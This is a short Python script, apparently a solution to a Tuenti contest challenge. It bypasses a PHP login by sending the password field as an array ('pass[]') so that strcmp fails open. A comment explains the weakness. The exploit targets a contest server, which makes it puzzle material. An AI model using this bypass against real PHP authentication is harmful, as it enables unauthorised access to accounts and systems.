#!/usr/bin/env pypy

import urllib

__author__ = "Alonso Vidales"
__email__ = "alonso.vidales@tras2.es"
__date__ = "2013-04-29"

class Spoof:
    __debug = False

    def resolve(self):
        # strcmp returns 0 when fails, and pass an array as first param makes the strcmp fail, don't trust
        # on the input who came from users
        data = urllib.urlencode({
            "key": self.__key,
            "pass[]": "I'm evil, muahaHAaha :)"
        })
        result = urllib.urlopen("http://pauth.contest.tuenti.net/", data).read()

        return result[24:]

    def __init__(self, inKey):
        self.__key = inKey

if __name__ == "__main__":
    print "%s" % (Spoof(raw_input()).resolve())
